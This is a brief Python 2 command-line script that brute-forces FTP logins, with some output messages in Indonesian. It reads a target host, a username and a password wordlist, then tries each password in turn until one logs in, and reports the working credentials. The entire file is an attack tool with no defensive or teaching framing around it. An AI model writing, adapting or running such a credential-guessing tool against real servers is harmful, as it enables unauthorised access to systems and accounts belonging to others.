import ftplib
from optparse import OptionParser
parser=OptionParser()
parser.add_option("-w",dest="wordlist",help="Passfile directory",type="string")
parser.add_option("-t",dest="target",help="DNS or IP of a target",type="string")
parser.add_option("-l",dest="username",help="FTP username",type="string")
(opts,args)=parser.parse_args()
if opts.wordlist is None or opts.target is None:
    parser.error("you must provide target and passfile!")
passfile=opts.wordlist
host=opts.target
user=opts.username
def bruteftp(host,passfile,user):
    pF=open(passfile,'r')
    for line in pF.readlines():
        password=line
        print "\r[+] Trying %s:%s" %(user,password)
        try:
            ftp=ftplib.FTP(host)
            ftp.login(user,password)
            print "[*] Logon Sukses: %s:%s" %(user,password)
            ftp.quit()
            return(user,password)

        except:
            pass
    print "[-] Tidak ada yang cocok"
    return(None,None)

bruteftp(host,passfile,user)

    
